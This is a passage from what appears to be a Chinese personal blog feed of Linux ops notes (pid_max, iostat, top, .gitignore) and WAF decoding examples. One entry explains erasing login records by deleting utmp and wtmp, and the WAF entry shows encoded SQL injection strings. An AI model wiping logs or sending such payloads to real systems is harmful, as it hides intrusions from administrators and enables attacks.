class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure><h4 id="长久生效"><a href="#长久生效" class="headerlink" title="长久生效"></a>长久生效</h4><p>echo “kernel.pid_max&#x3D;1000000” &gt;&gt; &#x2F;etc&#x2F;sysctl.conf</p><p>sysctl -p</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># echo &quot;kernel.pid_max=1000000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="hljs-section">[root@web-54 vsftpd]</span><span class="hljs-comment"># sysctl -p</span><br><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.rp_filter</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.accept_source_route</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.sysrq</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.core_uses_pid</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.tcp_syncookies</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-ip6tables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-iptables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.bridge.bridge-nf-call-arptables</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">kernel.msgmnb</span> = <span class="hljs-number">65536</span><br><span class="hljs-attr">kernel.msgmax</span> = <span class="hljs-number">65536</span><br><span class="hljs-attr">kernel.shmmax</span> = <span class="hljs-number">68719476736</span><br><span class="hljs-attr">kernel.shmall</span> = <span class="hljs-number">4294967296</span><br><span class="hljs-attr">kernel.panic</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.all.accept_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.accept_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.all.send_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.send_redirects</span> = <span class="hljs-number">0</span><br><span class="hljs-attr">net.ipv4.conf.default.arp_ignore</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.default.arp_announce</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">net.ipv4.conf.all.arp_ignore</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">net.ipv4.conf.all.arp_announce</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">net.ipv4.ip_no_pmtu_disc</span> = <span class="hljs-number">1</span><br><span class="hljs-attr">kernel.pid_max</span> = <span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/01/yunwei/yunweicommands/Linuxcommands/iostat/"/>
    <url>/2024/04/01/yunwei/yunweicommands/Linuxcommands/iostat/</url>
    
    <content type="html"><![CDATA[<p>查看磁盘  </p><p>iostat -kdx 1</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># iostat -kdx 1</span><br>Linux <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1160.108</span>.<span class="hljs-number">1</span>.el7.x86_64 (iZbp1191gh7vw52537lyxrZ) <span class="hljs-number">2024</span>年<span class="hljs-number">04</span>月<span class="hljs-number">01</span>日 _x86_64_(<span class="hljs-number">2</span> CPU)<br><br><span class="hljs-params">Device:</span>         rrqm<span class="hljs-symbol">/s</span>   wrqm<span class="hljs-symbol">/s</span>     r<span class="hljs-symbol">/s</span>     w<span class="hljs-symbol">/s</span>    rkB<span class="hljs-symbol">/s</span>    wkB<span class="hljs-symbol">/s</span> avgrq-sz avgqu-sz   await r_await w_await  svctm  %util<br>vda               <span class="hljs-number">0.01</span>     <span class="hljs-number">0.54</span>    <span class="hljs-number">0.69</span>    <span class="hljs-number">0.93</span>    <span class="hljs-number">13.30</span>    <span class="hljs-number">22.99</span>    <span class="hljs-number">44.85</span>     <span class="hljs-number">0.05</span>   <span class="hljs-number">28.32</span>    <span class="hljs-number">6.07</span>   <span class="hljs-number">44.98</span>   <span class="hljs-number">0.69</span>   <span class="hljs-number">0.11</span><br><br><span class="hljs-params">Device:</span>         rrqm<span class="hljs-symbol">/s</span>   wrqm<span class="hljs-symbol">/s</span>     r<span class="hljs-symbol">/s</span>     w<span class="hljs-symbol">/s</span>    rkB<span class="hljs-symbol">/s</span>    wkB<span class="hljs-symbol">/s</span> avgrq-sz avgqu-sz   await r_await w_await  svctm  %util<br>vda               <span class="hljs-number">0.00</span>     <span class="hljs-number">0.00</span>    <span class="hljs-number">1.00</span>    <span class="hljs-number">0.00</span>     <span class="hljs-number">8.00</span>     <span class="hljs-number">0.00</span>    <span class="hljs-number">16.00</span>     <span class="hljs-number">0.00</span>    <span class="hljs-number">1.00</span>    <span class="hljs-number">1.00</span>    <span class="hljs-number">0.00</span>   <span class="hljs-number">2.00</span>   <span class="hljs-number">0.20</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>top</title>
    <link href="/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/"/>
    <url>/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>默认自带该命令</p><p>用于实时动态的查看系统的整体运行情况</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>top(选项)</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>-b : 以批处理模式操作</p><p>-c : 显示完整的命令</p><p>-d : 屏幕刷新间隔时间   -d ss.tt (seconds.tenths)</p><p>-I ：忽略失效过程</p><p>-s ：累积模式</p><p>-i&lt;时间&gt;  : 设置间隔时间</p><p>-u&lt;用户名&gt;：指定用户名</p><p>-p&lt;进程号&gt;：指定进程</p><p>-n&lt;次数&gt;：循环显示的次数</p><p>-o [+&#x2F;-]fieldname1 ：指定排序字段，+表示降序，-表示升序</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@VM_160_165_centos</span> ~]# top<br>top - <span class="hljs-number">20</span>:<span class="hljs-number">39</span>:<span class="hljs-number">29</span> up <span class="hljs-number">4</span> days<span class="hljs-punctuation">,</span> <span class="hljs-number">28</span> <span class="hljs-keyword">min</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">2</span> users<span class="hljs-punctuation">,</span>  <span class="hljs-keyword">load</span> average: <span class="hljs-number">0.00</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.00</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.00</span><br>Tasks: <span class="hljs-number">110</span> total<span class="hljs-punctuation">,</span>   <span class="hljs-number">1</span> running<span class="hljs-punctuation">,</span> <span class="hljs-number">109</span> sleeping<span class="hljs-punctuation">,</span>   <span class="hljs-number">0</span> stopped<span class="hljs-punctuation">,</span>   <span class="hljs-number">0</span> zombie<br>Cpu(s):  <span class="hljs-number">0.2</span><span class="hljs-variable">%us</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.2</span><span class="hljs-variable">%sy</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%ni</span><span class="hljs-punctuation">,</span> <span class="hljs-number">99.0</span><span class="hljs-variable">%id</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.7</span><span class="hljs-variable">%wa</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%hi</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%si</span><span class="hljs-punctuation">,</span>  <span class="hljs-number">0.0</span><span class="hljs-variable">%st</span><br>Mem:   <span class="hljs-number">3922456</span>k total<span class="hljs-punctuation">,</span>  <span class="hljs-number">1292332</span>k used<span class="hljs-punctuation">,</span>  <span class="hljs-number">2630124</span>k <span class="hljs-keyword">free</span><span class="hljs-punctuation">,</span>   <span class="hljs-number">667296</span>k buffers<br>Swap:        <span class="hljs-number">0</span>k total<span class="hljs-punctuation">,</span>        <span class="hljs-number">0</span>k used<span class="hljs-punctuation">,</span>        <span class="hljs-number">0</span>k <span class="hljs-keyword">free</span><span class="hljs-punctuation">,</span>   <span class="hljs-number">427100</span>k cached<br><br>  PID USER      PR  NI  VIRT  RES  SHR S <span class="hljs-variable">%CPU</span> <span class="hljs-variable">%MEM</span>    TIME+  COMMAND                                                                          <br><span class="hljs-number">25723</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">62160</span> <span class="hljs-number">9472</span> <span class="hljs-number">2108</span> S  <span class="hljs-number">0.3</span>  <span class="hljs-number">0.2</span>   <span class="hljs-number">0</span>:<span class="hljs-number">01.02</span> barad_agent                                                                       <br><span class="hljs-number">25724</span> root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">434</span>m  <span class="hljs-number">12</span>m <span class="hljs-number">2240</span> S  <span class="hljs-number">0.3</span>  <span class="hljs-number">0.3</span>   <span class="hljs-number">0</span>:<span class="hljs-number">05.51</span> barad_agent  <br></code></pre></td></tr></table></figure><p>说明：</p><p>top - 20:39:29当前系统时间</p><p>up 4 days, 28 min系统运行时间</p><p>2 users当前登录用户</p><p>load average: 0.00, 0.00, 0.00系统负载，任务队列的平均长度</p><p>Tasks: 110 total总进程数</p><p>1 running正在运行的进程数</p><p>109 sleeping睡眠的进程数</p><p> 0 stopped停止的进程数</p><p>0 zombie冻结的进程数</p><p>Cpu(s):  0.2%us用户空间占用 CPU 百分比</p><p>0.2%sy内核空间占用 CPU 百分比</p><p>0.0%ni用户进程空间内改变过优先级的进程占用CPU百分比</p><p>99.0%id空闲 CPU 百分比</p><p>0.7%wa等待输入输出的 CPU 时间百分比</p><p>0.0%si</p><p>0.0%st</p><p>Mem:   3922456k total物理内存总量</p><p>1292332k used使用的物理内存总量</p><p>2630124k free空闲内存总量</p><p>667296k buffers用作内核缓存的内存量</p><p>Swap:        0k total交换区内存总量</p><p>0k used使用的交换区总量</p><p>0k free空闲交换区总量</p><p>427100k cached缓冲的交换区总量</p><p>VIRT</p><p>virtual memory usage 虚拟内存</p><p>进程需要的虚拟内存大小</p><p>如果进程申请 100M 内存，实际只使用 10 M ，值会增长 100M</p><p>RES</p><p>resident memory usage 常驻内存</p><p>进程当前使用的内存大小，不包括 swap out</p><p>包含其他进程的共享</p><p>只统计加载的库文件所占内存大小</p><p>如果进程申请 100M 内存，实际只使用 10M ，值只会增长 10M，与 VIRT 相反</p><p>SHR</p><p>shared memory 共享内存</p><p>除了自身进程的共享内存，也包括其他进程的共享内存</p><p>虽然进程只使用几个共享库的函数，但是包含了整个共享库的大小</p><p>某个进程所占物理内存大小： RES - SHR</p><p>swap out 后，值会下降</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="查看每个-CPU-的使用情况"><a href="#查看每个-CPU-的使用情况" class="headerlink" title="查看每个 CPU 的使用情况"></a>查看每个 CPU 的使用情况</h3><p>top 命令之后按  1  ,会显示每个 CPU 的使用情况，如果不操作，显示的是 CPU 的平均状态</p><p><img src="/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/clipboard-16377255556361.png" alt="img"></p><p>load average: 237.05, 235.56, 231.97</p><p>这个值是 CPU 内存 硬盘 综合的负载</p><h3 id="查看指定进程的完整命令"><a href="#查看指定进程的完整命令" class="headerlink" title="查看指定进程的完整命令"></a>查看指定进程的完整命令</h3><p>top -c -p 1097</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/home/ubuntu<span class="hljs-comment"># top -c -p 1097</span><br>top - 16:36:12 up<span class="hljs-number"> 1 </span>day, 17:56, <span class="hljs-number"> 2 </span>users,  load average: 0.00, 0.00, 0.00<br>Tasks:  <span class="hljs-number"> 1 </span>total,  <span class="hljs-number"> 0 </span>running,  <span class="hljs-number"> 1 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.7 us,  0.2 sy,  0.0 ni, 99.2 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>MiB Mem :   3935.6 total,   2508.0 free,    309.4 used,   1118.1 buff/cache<br>MiB Swap:      0.0 total,      0.0 free,      0.0 used.   3385.2 avail Mem<br><br>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br>  <span class="hljs-number"> 1097 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span><span class="hljs-number"> 874176 </span><span class="hljs-number"> 89136 </span><span class="hljs-number"> 49940 </span>S   0.0   2.2   0:21.24 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock<br></code></pre></td></tr></table></figure><h3 id="3、查看CPU占用"><a href="#3、查看CPU占用" class="headerlink" title="3、查看CPU占用"></a>3、查看CPU占用</h3><p><strong>top -c -o +%CPU</strong></p><p>以%CPU为指标降序排列</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/home/ubuntu<span class="hljs-comment"># top -c -o +%CPU</span><br>top - 16:41:52 up<span class="hljs-number"> 1 </span>day, 18:01, <span class="hljs-number"> 2 </span>users,  load average: 0.05, 0.03, 0.00<br>Tasks:<span class="hljs-number"> 115 </span>total,  <span class="hljs-number"> 1 </span>running,<span class="hljs-number"> 114 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.2 us,  0.2 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>MiB Mem :   3935.6 total,   2508.6 free,    308.6 used,   1118.4 buff/cache<br>MiB Swap:      0.0 total,      0.0 free,      0.0 used.   3386.0 avail Mem<br><br>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br>    <span class="hljs-number"> 10 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>S   0.3   0.0   0:01.16 [ksoftirqd/0]<br>  <span class="hljs-number"> 1670 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span> <span class="hljs-number"> 47856 </span><span class="hljs-number"> 11448 </span> <span class="hljs-number"> 3872 </span>S   0.3   0.3   1:32.43 barad_agent<br>  <span class="hljs-number"> 1671 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span><span class="hljs-number"> 491996 </span><span class="hljs-number"> 14372 </span> <span class="hljs-number"> 4312 </span>S   0.3   0.4   7:37.78 barad_agent<br></code></pre></td></tr></table></figure><p>dmidecode | grep Product</p><p>查看物理机型号</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">[root@iZbp1191gh7vw52537lyxrZ ~]# dmidecode | grep <span class="hljs-built_in">Product</span><br><span class="hljs-built_in">Product</span> <span class="hljs-built_in">Na</span><span class="hljs-symbol">me:</span> Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><p>atop</p><p>ATOP - 10                               2019&#x2F;04&#x2F;29  21:06:18                               ———                                10s elapsed</p><p>PRC | sys    0.22s | user   0.17s  | #proc    809 | #trun      1 | #tslpi   800  | #tslpu   242 | #zombie    0 | clones     0  | #exit      0 |</p><p>CPU | sys       2% | user      1%  | irq       0% | idle   3041% | wait    156%  | steal     0% | guest     0% | curf 2.50GHz  | curscal   ?% |</p><p>CPL | avg1  235.50 | avg5  232.99  | avg15 232.35 |              |               | csw     4910 | intr   14354 |               | numcpu    32 |</p><p>MEM | tot    31.3G | free  563.4M  | cache  14.2G | dirty   0.5M | buff  843.2M  | slab  980.2M | slrec 855.1M | shmem   0.2M  | shrss   0.0M |</p><p>SWP | tot   128.0G | free  126.5G  |              |              |               |              |              | vmcom  18.3G  | vmlim 143.7G |</p><p>DSK |          sda | busy    100%  | read      73 | write   1050 | KiB&#x2F;r      5  | KiB&#x2F;w      6 | MBr&#x2F;s   0.04 | MBw&#x2F;s   0.67  | avio 8.90 ms |</p><p>NET | transport    | tcpi      13  | tcpo      13 | udpi       0 | udpo       0  | tcpao      5 | tcppo      0 | tcprs      0  | udpip   9276 |</p><p>NET | network      | ipi     9745  | ipo       13 | ipfrw      0 | deliv   9292  |              |              | icmpi      0  | icmpo      0 |</p><p>NET | em1       0% | pcki   10260  | pcko       1 | si 2474 Kbps | so    1 Kbps  | erri       0 | erro       0 | drpi       0  | drpo       0 |</p><p>NET | em20% | pcki      18  | pcko       0 | si    1 Kbps | so    0 Kbps  | erri       0 | erro       0 | drpi    0  | drpo       0 |</p><p>NET | lo      —- | pcki      12  | pcko      12 | si    0 Kbps | so    0 Kbps  | erri       0 | erro       0 | drpi       0  | drpo       0 |</p><p>  PID     TID   RUID       EUID        THR   SYSCPU   USRCPU    VGROW    RGROW    RDDSK    WRDSK   ST   EXC   S   CPUNR    CPU   CMD        1&#x2F;2</p><p>38548       -   root       root          1    0.12s    0.05s    1852K    1852K       0K       0K   –     -   R       1     2%   atop</p><p>12749       -   root   root        144    0.02s    0.06s       0K     128K       0K       8K   –     -   S      19     1%   java</p><p>38418       -   sec    sec          54    0.02s    0.03s       0K       0K     360K       8K   –     -   S      18     1%   java</p><p>10876       -   smmsp      smmsp         1    0.00s    0.01s       0K       0K       0K       0K   –     -   D       0     0%   sendmail</p><p> 7570       -   smmsp      smmsp         1    0.01s    0.00s   0K       0K       0K       0K   –     -   D       3     0%   sendmail</p><p>48544       -   root       root         10    0.00s    0.01s   0K     360K       0K      12K   –     -   D       0     0%   node</p><p>31529       -   smmsp      smmsp         1    0.01s    0.00s       0K       0K       0K       0K   –     -   D       5     0%   sendmail</p><p>30859       -   mysql      mysql        16    0.01s    0.00s       0K       0K       0K       0K   –     -   S       0     0%   mysqld</p><p>41246       -   root       root          4    0.00s    0.01s       0K       0K       0K       0K   –     -   S      26     0%   rsyslogd</p><p>  136       -   root    root          1    0.01s    0.00s       0K       0K       0K       0K   –     -   S       5     0%   events&#x2F;5</p><p>  204       -   root       root          1    0.01s    0.00s       0K       0K       0K       0K   –     -   S       2     0%   kblockd&#x2F;2</p><p> 1788       -   root       root          1    0.01s    0.00s   0K       0K       0K       4K   –     -   D       2     0%   flush-8:0</p><p>33709       -   smmsp      smmsp         1    0.00s    0.00s   0K       0K       0K       0K   –     -   D      18     0%   sendmail</p><p>22496       -   smmsp      smmsp         1    0.00s    0.00s   0K       0K       0K       0K   –     -   D      18     0%   sendmail</p><p><img src="/2024/04/01/yunwei/yunweicommands/Linuxcommands/top/image-20240401192203874.png" alt="image-20240401192203874"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Linux top命令的用法详细详解] 莫水千流 2017-01-21 09:09 </p><p>链接：<a href="http://www.cnblogs.com/zhoug2020/p/6336453.html">http://www.cnblogs.com/zhoug2020/p/6336453.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>top</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/15/security/secresponse/attack_hidden/"/>
    <url>/2024/03/15/security/secresponse/attack_hidden/</url>
    
    <content type="html"><![CDATA[<p>登录信息清除</p><p>删除或清空 &#x2F;var&#x2F;run&#x2F;utmp &#x2F;var&#x2F;log&#x2F;wtmp ，删除后不会产生新的文件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>code_repo_reinforce</title>
    <link href="/2024/03/15/security/codesec/code_repo_reinforce/"/>
    <url>/2024/03/15/security/codesec/code_repo_reinforce/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github 为了安全性需要禁止上传敏感内容，所以需要.gitignore 文件来设置哪些文件不需要上传进行版本管理</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/dir/</span> 过滤整个文件夹<br>*<span class="hljs-string">.txt</span> 过滤所有<span class="hljs-string">.txt</span>文件<br><span class="hljs-string">/dir/config.php</span> 过滤具体文件<br></code></pre></td></tr></table></figure><p><img src="/2024/03/15/security/codesec/code_repo_reinforce/image-20241224171307321.png" alt="image-20241224171307321"></p><p>说明：</p><p>过滤掉的文件不会上传，也就是说不会进行版本管理，本地还是会有的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/ 开头表示目录<br>* 通配多个字符<br>? 通配单个字符<br><span class="hljs-string">[]</span> 包含单个字符的匹配列表<br>! 表示不忽略匹配的文件或者目录，也就是会上传<br></code></pre></td></tr></table></figure><p>规则匹配策略：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">自上到下进行匹配<br></code></pre></td></tr></table></figure><h2 id="错误总结"><a href="#错误总结" class="headerlink" title="错误总结"></a>错误总结</h2><p>1、不生效原因</p><p>可能是已经在缓存中，清除缓存，重新上传</p><p>git rm -r –cached .</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>codesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>codesec</tag>
      
      <tag>安全加固</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>waf_base</title>
    <link href="/2024/03/15/security/netsec/waf/waf_base/"/>
    <url>/2024/03/15/security/netsec/waf/waf_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>可以用于数据分析的点</p><p>1、流量来源</p><p>2、流量构成</p><p>3、爬虫类型</p><p>4、爬虫行为</p><h2 id="解码方式"><a href="#解码方式" class="headerlink" title="解码方式"></a>解码方式</h2><h3 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span> URL decode后是 <span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="JSON解码"><a href="#JSON解码" class="headerlink" title="JSON解码"></a>JSON解码</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;: <span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>&#125; Json解码后是 <span class="hljs-selector-attr">[a,b]</span>,<span class="hljs-selector-attr">[c,d]</span><br></code></pre></td></tr></table></figure><h3 id="Base64-解码"><a href="#Base64-解码" class="headerlink" title="Base64 解码"></a>Base64 解码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MScgb3IgMT0x</span> Base64解码后是 <span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Base64-RFC-2045-解码"><a href="#Base64-RFC-2045-解码" class="headerlink" title="Base64(RFC 2045) 解码"></a>Base64(RFC 2045) 解码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MSdvciAx</span>.PTEgLS0= BASE64(rfc-<span class="hljs-number">2045</span>)解码后是 <span class="hljs-number">1</span>&#x27;or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --<br></code></pre></td></tr></table></figure><h3 id="16进制转换解码-HEX编码"><a href="#16进制转换解码-HEX编码" class="headerlink" title="16进制转换解码&#x2F;HEX编码"></a>16进制转换解码&#x2F;HEX编码</h3><p>linux中xxd和hexdump命令编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">27</span>\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">72</span>\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>\<span class="hljs-keyword">x</span><span class="hljs-number">31</span>\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">31</span> Hex解码后是 <span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="二进制解码-BINARY-解码"><a href="#二进制解码-BINARY-解码" class="headerlink" title="二进制解码&#x2F;BINARY 解码"></a>二进制解码&#x2F;BINARY 解码</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0011000100100111001000000111010101101110011010010110111101101110001000000111001101100101011011000110010101100011011101000010000000110001001011000110010001100001011101000110000101100010011000010111001101100101001010000010100100100011 </span>binary 解码后是 <span class="hljs-number">1</span><span class="hljs-comment">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure><h3 id="斜杠转义"><a href="#斜杠转义" class="headerlink" title="斜杠转义"></a>斜杠转义</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\n</span> 斜杠反转义后是 换行(<span class="hljs-string">\x0a)</span><br></code></pre></td></tr></table></figure><h3 id="XML-解码"><a href="#XML-解码" class="headerlink" title="XML 解码"></a>XML 解码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">解码输入:<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">site</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RUNOOB<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://www.runoob.com<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span 